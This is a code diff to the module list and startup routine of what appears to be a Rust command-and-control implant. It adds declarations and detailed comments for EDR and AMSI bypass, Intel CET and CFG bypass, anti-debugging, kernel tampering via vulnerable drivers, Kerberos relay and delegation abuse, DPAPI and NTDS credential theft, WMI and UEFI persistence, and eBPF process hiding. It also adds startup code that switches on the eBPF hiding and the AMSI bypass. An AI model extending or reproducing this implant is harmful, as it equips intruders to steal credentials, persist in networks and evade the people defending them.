@@ -65,6 +65,12 @@ macro_rules! emulated_syscall {
 #[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
 pub mod stack_db;
 
+// Indirect-syscall stack spoofing with synthetic multi-frame call chains.
+// Provides transit gadgets and Win32 API call chain construction for
+// spoof_call / clean_call integration.  Gated behind `stack-spoof` + x86_64.
+#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+pub mod stack_spoof;
+
 // Self-re-encoding ("Metamorphic Lite"): re-encode .text at runtime.
 #[cfg(feature = "self-reencode")]
 pub mod self_reencode;
@@ -93,6 +99,33 @@ pub mod ntdll_unhook;
 // and anti-forensics.  Replaces the Ekko-style sleep on Windows.
 #[cfg(windows)]
 pub mod sleep_obfuscation;
+
+// Timer-based sleep using NtCreateTimer + NtSetTimer + NtWaitForSingleObject.
+// Avoids NtDelayExecution entirely — timer fires through a different kernel
+// path (KE_TIMER → KiDeliverApc) that is less commonly hooked by EDR.
+// Uses NtQueryPerformanceCounter for hardware timestamps and can target a
+// clean-mapped DLL gadget for the APC callback address.
+#[cfg(all(windows, target_arch = "x86_64"))]
+pub mod hw_timer_sleep;
+
+// Memory Encryption with Thread Context: encrypts thread register states
+// (CONTEXT structs), stack pointers, and TLS data during sleep obfuscation.
+// Suspends all non-current threads, captures and XChaCha20-Poly1305-encrypts
+// their CONTEXT structs, then restores on wake.  Prevents forensic tools
+// from recovering execution state from suspended thread registers.
+// Windows-only, gated by `thread-ctx-encrypt` feature.
+#[cfg(all(windows, feature = "thread-ctx-encrypt"))]
+pub mod thread_context_encrypt;
+
+// Trampoline-based stack spoofing: builds multi-frame synthetic call stacks
+// using trampolines through clean-mapped system DLLs.  Produces call stacks
+// that appear as normal application worker threads when inspected by EDR
+// stack-walking tools.  Allocates a separate fake stack with plausible return
+// addresses, frame pointers, and shadow space.  Falls back to spoof_call
+// when trampolines are unavailable.  Windows x86_64 only, gated by the
+// `trampoline-spoof` feature flag (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "trampoline-spoof", target_arch = "x86_64"))]
+pub mod trampoline_spoof;
 
 // Continuous memory hiding ("Evanesco"): keeps all pages NOT actively being
 // executed in an encrypted/PAGE_NOACCESS state at ALL times.  Per-page RC4
@@ -167,6 +200,16 @@ pub mod lsa_whisperer_ssp;
 #[cfg(all(windows, feature = "kernel-callback"))]
 pub mod kernel_callback;
 
+// Kernel-level process argument spoofing via BYOVD: modifies _EPROCESS
+// structures directly (SeAuditProcessCreationInfo, ImageFileName, and
+// RTL_USER_PROCESS_PARAMETERS) so the spoofed arguments are the only
+// version that ever existed in any log (Event Log 4688, PEB, EPROCESS).
+// Unlike userland PEB-only spoofing, kernel-level spoofing happens before
+// any forensic tool can snapshot the original values.  Requires the
+// kernel-callback feature (BYOVD driver deployed).  Windows x86_64 only.
+#[cfg(all(windows, feature = "kernel-callback"))]
+pub mod kernel_arg_spoof;
+
 // Automated EDR bypass transformation engine: scans the agent's own .text
 // section for byte signatures known to be detected by EDR (YARA rules, entropy
 // heuristics, known gadget chains like "4C 8B D1 B8" for direct syscall stubs).
@@ -232,6 +275,110 @@ pub mod syscall_emulation;
 #[cfg(all(windows, feature = "cet-bypass"))]
 pub mod cet_bypass;
 
+// Shadow Stack Forging for Intel CET: proactively forges entries on the
+// hardware-enforced shadow stack using the WRSS (Write Reference to Shadow
+// Stack) instruction.  This makes redirected return addresses created by
+// spoof_call appear legitimate to CET's hardware enforcement, preventing
+// #CP (Control Protection) exceptions.  Approaches:
+//   (1) WRSS-based forging — writes the gadget address onto the shadow stack
+//       before spoof_call, so the API's RET finds a matching entry.
+//   (2) SSP manipulation — save/restore shadow stack pointer via
+//       SAVEPREVSSP/RSTORSSP/INCSSPQ for complete shadow stack switching.
+//   (3) Pre-spoof preparation — integrate with clean_call! to automatically
+//       forge/restore shadow stack entries around every spoofed call.
+// Gracefully degrades when CET is not available (no-op).  Windows x86_64
+// only, gated by `cet-bypass` feature flag.
+#[cfg(all(windows, feature = "cet-bypass"))]
+pub mod shadow_stack_forge;
+
+// Indirect Branch Tracking (IBT) Bypass for Intel CET: scans clean-mapped
+// system DLLs for ENDBR64 gadgets (F3 0F 1E FA) that can serve as IBT-valid
+// indirect branch targets.  IBT requires every indirect call/jump target to
+// start with ENDBR64; we reuse ENDBR64 locations found in large system
+// binaries (ntdll, kernel32, kernelbase) as trampolines:
+//   (1) ENDBR64 scanner — finds all ENDBR64 instructions in .text sections,
+//       categorizes them (FunctionEntry, MidFunction, AfterNop, ExceptionEntry),
+//       and analyzes the instructions after each ENDBR64 for gadget operations
+//       (jmp reg, call reg, ret, syscall).
+//   (2) Gadget database — indexes found gadgets by operation type (JmpRax,
+//       CallRax, RetGadgets, SyscallGadgets) for efficient lookup.
+//   (3) IBT-safe execution — dispatches indirect calls through ENDBR64; jmp rax
+//       gadgets so IBT's hardware check passes, then the gadget redirects to
+//       the actual API target.
+//   (4) Integration with spoof_call — wraps the existing spoofing mechanism
+//       with IBT-valid dispatch, using the same stack manipulation but routing
+//       through an ENDBR64 gadget instead of directly to the API.
+// Gracefully degrades when IBT is not active (uses existing spoof_call).
+// Windows x86_64 only, gated by `cet-bypass` feature flag.
+#[cfg(all(windows, feature = "cet-bypass"))]
+pub mod ibt_bypass;
+
+// Exception-based SSN resolution (Tartarus' Gate): resolves NT syscall numbers
+// via a VEH handler that fires on access violations, reading the SSN from
+// NTDLL function prologues as the hook chain is walked.  Bypasses all EDR
+// ntdll hooks without reading the .text section or mapping a clean ntdll.
+// Two strategies: (1) direct hook-chain walking (no exception), (2) VEH-based
+// exception handler that catches STATUS_ACCESS_VIOLATION on hooked stubs.
+// Windows-only, gated by `direct-syscalls` feature flag.
+#[cfg(all(windows, feature = "direct-syscalls"))]
+pub mod exception_ssn;
+
+// SEH-based anti-debugging: constructs deeply nested, valid VEH handler chains
+// that cause analysis tools, debuggers, and emulators to mis-execute or crash
+// when attempting to trace execution.  NOT traditional anti-debugging (no
+// IsDebuggerPresent, no NtQueryInformationProcess(ProcessDebugPort)) — operates
+// through the Windows exception dispatch mechanism itself.  Six anti-debug
+// strategies: trap flag single-step detection, CloseHandle with invalid handle,
+// int 0x2D breakpoint, icebp (0xF1), lock-prefix null deref, and instrumentation
+// callback query.  Includes SEH-based code obfuscation (fragment encryption with
+// VEH-driven decryption), anti-trace (single-step counting with time windows),
+// and SEH chain integrity verification.  Windows-only, gated by `seh-anti-debug`
+// feature flag.
+#[cfg(all(windows, feature = "seh-anti-debug"))]
+pub mod seh_anti_debug;
+
+// Page fault driven execution: keeps payload pages encrypted with
+// XChaCha20-Poly1305 under PAGE_NOACCESS.  A VEH handler intercepts
+// STATUS_ACCESS_VIOLATION faults, decrypts the faulting page, sets
+// PAGE_EXECUTE_READ, and resumes execution.  A periodic timer re-encrypts
+// stale pages.  Includes anomaly detection.  Windows x86_64 only,
+// gated by `page-fault-exec` feature flag.
+#[cfg(all(windows, feature = "page-fault-exec", target_arch = "x86_64"))]
+pub mod page_fault_exec;
+
+// Counterfeit Object-Oriented Programming (COOP): an evolution of ROP that
+// chains calls through C++ virtual function dispatch rather than raw gadgets.
+// Because COOP chains go through legitimate vtable pointers in legitimate
+// objects, CFI/CFG implementations see only valid indirect call targets
+// throughout the chain.  Scans system DLLs for vtables, classifies virtual
+// functions by behavior, constructs counterfeit objects, and chains
+// operations via virtual dispatch.  No executable memory is allocated —
+// only data objects (PAGE_READWRITE).  Windows x86_64 only, gated by
+// `coop` feature flag.
+#[cfg(all(windows, feature = "coop", target_arch = "x86_64"))]
+pub mod coop;
+
+// Kernel stack pivoting via APC (BYOVD): queues kernel APCs to threads and
+// pivots their kernel stacks to controlled buffers, bypassing EDR kernel
+// callback instrumentation entirely.  Build-specific KTHREAD/EPROCESS offset
+// tables for Windows 10 20H1 through Windows 11 24H2.  Allocates KAPC
+// structures in non-paged pool via direct kernel memory write.  Research-grade
+// — requires deployed vulnerable driver.  Windows x86_64 only, gated by
+// `kernel-callback` feature flag.
+#[cfg(all(windows, feature = "kernel-callback", target_arch = "x86_64"))]
+pub mod kernel_apc_pivot;
+
+// Control Flow Guard (CFG) bypass: three strategies to bypass Microsoft's
+// CFG implementation which validates indirect call targets against a kernel-
+// maintained bitset.  (1) Promote agent/shellcode addresses directly in the
+// CFG bitset.  (2) Route execution through CFG-valid trampolines found in
+// system DLLs (call rax/call r10 gadgets).  (3) Override the CFG dispatch
+// function pointer to always return TRUE.  Integrates with spoof_call and
+// clean_call! to promote target addresses before indirect calls.
+// Windows-only, gated by `cfg-bypass` feature flag (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "cfg-bypass"))]
+pub mod cfg_bypass;
+
 // Token-only impersonation via NtImpersonateThread / SetThreadToken:
 // bypasses ImpersonateNamedPipeClient detection by extracting the
 // impersonation token through a helper thread and applying it to the
@@ -243,6 +390,27 @@ pub mod cet_bypass;
 // (implies `direct-syscalls`).
 #[cfg(all(windows, feature = "token-impersonation"))]
 pub mod token_impersonation;
+
+// Adaptive C2 timing: learns the target network's traffic patterns and
+// adjusts callback timing to blend in with observed traffic.  Replaces
+// simple fixed-percentage jitter with Gaussian-distributed timing modelled
+// on real inter-arrival statistics.  Three phases (Learning → Active →
+// Evasion), peak/quiet hour detection, and burst-pattern analysis.
+// Cross-platform, no external ML dependencies.  Gated by `adaptive-timing`.
+#[cfg(feature = "adaptive-timing")]
+pub mod adaptive_timing;
+
+// Reflective DLL loading via NtCreateSection + NtMapViewOfSection.
+// Loads PE DLLs into the current or a remote process without calling
+// VirtualAlloc/VirtualAllocEx — uses lower-level NT section primitives
+// that bypass the Win32 API layer entirely.  Handles PE32 and PE32+
+// relocations, IAT rebuilding, per-section memory protections, and
+// header cleanup.  Remote variant maps a shared section into both
+// agent and target process for cross-process injection.
+// Windows x86_64 only, gated by `reflective-loader` feature flag
+// (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "reflective-loader", target_arch = "x86_64"))]
+pub mod reflective_loader;
 
 // Forensic cleanup subsystem: removes forensic evidence left by injected
 // processes.  Currently provides Windows Prefetch (.pf) evidence removal
@@ -258,6 +426,152 @@ pub mod token_impersonation;
 // (implies `direct-syscalls`).
 #[cfg(all(windows, feature = "forensic-cleanup"))]
 pub mod forensic_cleanup;
+
+// Kerberos relay attack via COM cross-session activation: captures Kerberos
+// service tickets without NTLM by triggering COM activation (CoCreateInstanceEx
+// with custom COSERVERINFO) against an attacker-controlled RPC listener.  The
+// COM runtime sends a Kerberos AP-REQ in the RPC bind security trailer, which
+// the agent parses (minimal ASN.1/DER decoder) and returns to the operator.
+// Known exploitable CLSIDs (BITS, ICertPassage, TaskService, UpdateOrchestrator)
+// are hardcoded.  API resolution via pe_resolve (ole32.dll, kernel32.dll) — no
+// IAT entries.  Requires SeImpersonatePrivilege for COM activation.
+// Windows-only, gated by `kerberos-relay` feature flag.
+#[cfg(all(windows, feature = "kerberos-relay"))]
+pub mod kerberos_relay;
+
+// DPAPI domain backup key retrieval and secret decryption via MS-BKRP
+// (BackupKey Remote Protocol).  Retrieves the domain backup key from a
+// Domain Controller using RPC over named pipe (\pipe\lsarpc), then uses
+// it to decrypt DPAPI-protected secrets (Credential Store, Chrome, WiFi,
+// RDP) without touching LSASS memory.  Any domain-authenticated user can
+// retrieve the backup key — Domain Admin privileges are NOT required.
+// API resolution via pe_resolve (netapi32.dll, rpcrt4.dll, advapi32.dll)
+// — no IAT entries.  Windows-only, gated by `dpapi-backup` feature flag.
+#[cfg(all(windows, feature = "dpapi-backup"))]
+pub mod dpapi_backup;
+
+// Shadow Credentials attack: adds attacker-controlled X.509 certificate
+// credentials to a target user or computer object's msDS-KeyCredentialLink
+// attribute via LDAP, then authenticates as that principal via PKINIT Kerberos.
+// No password change required or logged.  Exploits delegated write permissions
+// — does NOT require Domain Admin.  Uses LDAP (wldap32.dll) for attribute
+// modification and raw Kerberos for PKINIT authentication.  API resolution via
+// pe_resolve — no IAT entries.  Windows-only, gated by `shadow-credentials`
+// feature flag.
+#[cfg(all(windows, feature = "shadow-credentials"))]
+pub mod shadow_credentials;
+
+// Registry-free COM object hijacking via SxS manifest activation contexts.
+// Redirects COM CLSID resolution to an attacker-controlled proxy DLL without
+// touching the Windows registry.  Uses activation contexts (CreateActCtxW /
+// ActivateActCtx / DeactivateActCtx / ReleaseActCtx) resolved by hash from
+// kernel32.dll.  Manifests are loaded from memory via temp file write-delete
+// cycle.  Includes a TargetSelector for identifying hijackable COM objects
+// and a proxy DLL PE generator.  No IAT entries — all API resolution via
+// pe_resolve hash-based resolution.  Windows-only, gated by `com-hijack`
+// feature flag.
+#[cfg(all(windows, feature = "com-hijack"))]
+pub mod com_hijack;
+
+// S4U2Self / S4U2Proxy Kerberos delegation abuse: discovers accounts with
+// constrained delegation (msDS-AllowedToDelegateTo) or protocol transition
+// (TRUSTED_TO_AUTH_FOR_DELEGATION) in Active Directory, then forges Kerberos
+// service tickets for arbitrary users.  The S4U2Self extension (PA-FOR-USER,
+// PA-DATA type 129) allows a service account with protocol transition to obtain
+// a ticket to itself on behalf of any domain user.  S4U2Proxy then uses that
+// ticket as evidence to request a forwardable service ticket to a backend
+// service listed in msDS-AllowedToDelegateTo.  The forged ticket can be
+// submitted to the current LSA session via LsaCallAuthenticationPackage
+// (KERB_SUBMIT_TKT).  LDAP delegation discovery via wldap32.dll, KDC
+// communication over TCP port 88 with 4-byte big-endian length framing, and
+// manual DER encoding for TGS-REQ / PA-FOR-USER construction.  All API
+// resolution via pe_resolve hash-based resolution — no IAT entries.
+// Windows-only, gated by `s4u-abuse` feature flag.
+#[cfg(all(windows, feature = "s4u-abuse"))]
+pub mod s4u_abuse;
+
+// COM Scriptlet (.sct) execution via xwizard.exe and alternative LOLBINs
+// (odbcconf.exe, pcwrun.exe, forfiles.exe).  Generates COM scriptlet XML
+// with inline JScript/VBScript that hosts shellcode via COM object
+// instantiation (ADODB.Stream → shellcode exec).  xwizard.exe is signed
+// by Microsoft and not commonly monitored by EDR.  Supports disk-based
+// execution (TEMP .sct files) and memory-mapped file via NtCreateSection.
+// Includes LolbinDispatcher for fallback when xwizard is unavailable.
+// NO powershell.exe, cmd.exe, wscript.exe, or mshta.exe in any path.
+// All API resolution via pe_resolve — no IAT entries.  Windows-only.
+#[cfg(all(windows, feature = "lolbin-xwizard"))]
+pub mod lolbin_xwizard;
+
+// WSL2 as an evasion layer: uses the Windows Subsystem for Linux v2 to
+// execute ELF binaries, run Linux-native tools (curl, socat, ncat), and
+// relay C2 traffic through the WSL2 VM — completely outside the Windows
+// security product surface.  Detection probes for wsl.exe availability,
+// LxssManager service state, and registered distros.  Execution strategies:
+// (1) temp-file: write ELF to Windows TEMP, access via /mnt/c/ from WSL,
+// (2) memfd_create: pipe ELF bytes to anonymous memory fd within WSL.
+// Networking via WSL2 (curl, socat, ncat) evades Windows network hooks.
+// File access via /mnt/c/ bridges Windows and WSL2 filesystems.  Injection
+// into WSL2 processes via ptrace (Linux-native, invisible to Windows EDR).
+// No Admin required — graceful degradation when WSL2 unavailable.  All API
+// resolution via pe_resolve — no IAT entries.  Windows-only.
+#[cfg(all(windows, feature = "wsl2-evasion"))]
+pub mod wsl2_evasion;
+
+// VSS (Volume Shadow Copy) pivoting: reads locked files (SAM, SYSTEM,
+// NTDS.dit) through VSS snapshot filesystem paths instead of direct access.
+// Bypasses file-access telemetry because EDR monitors direct opens but not
+// \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy paths.  Includes:
+// shadow copy discovery (vssadmin parsing + device path probing),
+// VSS file reader (NtCreateFile + NtReadFile via syscall! macro — no IAT
+// entries), SAM/NTDS credential harvesting (in-memory parsing of registry
+// hives and ESE databases), and selective cleanup (only deletes agent-created
+// snapshots, never touches system backups or restore points).
+// Windows-only, gated by `vss-pivot` feature flag.
+#[cfg(all(windows, feature = "vss-pivot"))]
+pub mod vss_pivot;
+
+// Entra ID Pass-the-Certificate: authenticates to Microsoft Entra ID (Azure AD)
+// using a stolen or forged X.509 certificate + RSA private key instead of a
+// password or client secret.  Implements the OAuth 2.0 client-credentials flow
+// with RS256 JWT assertion (RFC 7523).  Supports Azure Commercial and Azure
+// Government cloud endpoints.  Graph API helpers: list users, groups,
+// applications, service principals, directory roles, and arbitrary queries.
+// Token management includes automatic refresh, expiry tracking, and thread-
+// safe caching.  Cross-platform (Entra ID is cloud-based — no Windows-only
+// APIs needed).  Gated by `entra-ptc` feature flag (implies `ring`).
+#[cfg(feature = "entra-ptc")]
+pub mod entra_ptc;
+
+// WMI permanent event subscriptions with encrypted cloud payloads.
+// Installs the WMI persistence triad (EventFilter, EventConsumer,
+// FilterToConsumerBinding) via COM-based WMI operations.  The consumer
+// contains only a stager command — no shellcode.  Payloads are encrypted
+// with XChaCha20-Poly1305 and uploaded to cloud storage (Azure Blob,
+// AWS S3, or GitHub Gist).  The payload only materializes in memory when
+// the trigger fires.  Key derivation from URL + salt ensures the key is
+// never stored in plaintext in the WMI subscription.  All COM/WMI calls
+// via hash-based resolution — no IAT entries.  Windows-only, gated by
+// `wmi-persistence` feature flag.
+#[cfg(all(windows, feature = "wmi-persistence"))]
+pub mod wmi_persistence;
+
+// UEFI firmware-level persistence: NVRAM manipulation, ESP driver deployment,
+// EFI PE/COFF stub building, runtime DXE driver support, capsule delivery,
+// and detection/cleanup of firmware implants.  Cross-platform: Linux uses
+// /sys/firmware/efi/efivars, Windows uses GetFirmwareEnvironmentVariableW.
+// Gated by `uefi-persistence` feature flag.  Handlers in handlers.rs call
+// the uefi_persistence crate directly (no agent-side module wrapper needed).
+
+// eBPF-based Linux evasion: hides the agent process, files, and network
+// connections from user-space monitoring tools using the kernel's eBPF
+// subsystem.  Loads three BPF programs (hide_process, hide_files,
+// hide_network) as tracepoints on getdents64 and read syscalls.  Requires
+// root or CAP_BPF + CAP_SYS_ADMIN, Linux kernel >= 4.15 (>= 5.2
+// recommended), and clang on the build host.  Gracefully degrades when
+// unprivileged — the agent continues to run without eBPF evasion.
+// Linux-only, gated by `ebpf` feature flag (implies `direct-syscalls`).
+#[cfg(all(target_os = "linux", feature = "ebpf"))]
+pub mod ebpf_evasion;
 
 // RAII wrapper around NT kernel handles.  Automatically calls NtClose
 // via indirect syscall on drop, preventing handle leaks across early
@@ -567,25 +881,55 @@ impl Agent {
             crate::forensic_cleanup::timestamps::init_from_config(&cfg.timestamps);
         }
 
+        // eBPF-based Linux evasion: hides agent process, files, and network
+        // connections from user-space tools (ps, ls, netstat, ss) by loading
+        // eBPF programs into the kernel that hook getdents64 and read syscalls.
+        // Gracefully degrades if unprivileged or if the kernel doesn't support
+        // the required eBPF features.  Linux-only, gated by `ebpf` feature.
+        #[cfg(all(target_os = "linux", feature = "ebpf"))]
+        {
+            let pid = std::process::id();
+            let patterns: Vec<&str> = Vec::new(); // TODO: wire to config
+            let ports: Vec<u16> = Vec::new(); // TODO: wire to transport ports
+            let _ebpf_mgr = crate::ebpf_evasion::init(pid, &patterns, &ports);
+            // ebpf_mgr is dropped when the scope ends, which would detach
+            // programs.  For persistent evasion, the manager must be stored
+            // in the Agent struct or leaked.  For now we leak it so evasion
+            // persists for the lifetime of the process.
+            std::mem::forget(_ebpf_mgr);
+        }
+
         #[cfg(feature = "stealth")]
         {
             log::debug!("Applying evasion layers");
-            // AMSI bypass: choose HWBP OR memory patch, never both (H-11).
+            // AMSI bypass: choose one strategy, never combine (H-11).
             // The memory patch overwrites the bytes that HWBP set breakpoints on,
             // so running both makes the HWBP path silently no-op.
             //
-            // Strategy is selected at compile time via the `hwbp-amsi` feature:
-            //   - Default (no feature): memory-patch approach (no env-var trace).
-            //   - hwbp-amsi feature:     hardware-breakpoint VEH approach.
+            // Strategy is selected at compile time via feature flags:
+            //   - hw-bp-hook feature: general-purpose hw_bp_hook framework
+            //     (invisible hooks via Dr0–Dr3 with per-slot callbacks).
+            //   - hwbp-amsi feature:  simpler evasion.rs HWBP approach (Dr0/Dr1).
+            //   - Default (neither):  memory-patch approach (no env-var trace).
             // The old ORCHESTRA_AMSI_HWBP env-var check was a host-based IOC
             // and has been removed.
+            //
+            // Priority: hwbp-amsi > hw-bp-hook > default memory patch.
             #[cfg(feature = "hwbp-amsi")]
             {
                 unsafe {
                     crate::evasion::patch_amsi();
                 }
             }
-            #[cfg(not(feature = "hwbp-amsi"))]
+            #[cfg(all(not(feature = "hwbp-amsi"), feature = "hw-bp-hook"))]
+            {
+                let hwbp_ok = unsafe { crate::hw_bp_hook::install_amsi_bypass() };
+                if !hwbp_ok {
+                    log::warn!("hw-bp-hook AMSI bypass failed; falling back to memory patch");
+                    crate::amsi_defense::orchestrate_layers();
+                }
+            }
+            #[cfg(all(not(feature = "hwbp-amsi"), not(feature = "hw-bp-hook")))]
             {
                 crate::amsi_defense::orchestrate_layers();
             }
@@ -1055,8 +1399,24 @@ impl Agent {
 pub mod amsi_defense;
 #[cfg(windows)]
 pub mod callback_exec;
+// Code cave allocator: finds padding bytes in `.text` sections of loaded DLLs
+// for placing shellcode without new executable allocations. Used by
+// callback-based injection (injection::callback_exec) and other techniques
+// that require stealthy code placement. Windows x86_64 only.
+#[cfg(all(windows, target_arch = "x86_64"))]
+pub mod code_cave;
 pub mod etw_patch;
 pub mod evasion;
+
+// General-purpose hardware-breakpoint hooking framework using x86_64 debug
+// registers (Dr0–Dr3) and a VEH handler.  Provides invisible hooks that do
+// not modify any bytes in the target function — immune to code-integrity
+// checks.  Manages up to 4 simultaneous breakpoints with per-slot callback
+// dispatch.  Includes integrations for ETW suppression and AMSI bypass.
+// Windows x86_64 only, gated by `hw-bp-hook` (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
+pub mod hw_bp_hook;
+
 pub mod stub;
 
 // Inserting some random junk compilation artifacts (FR-2)
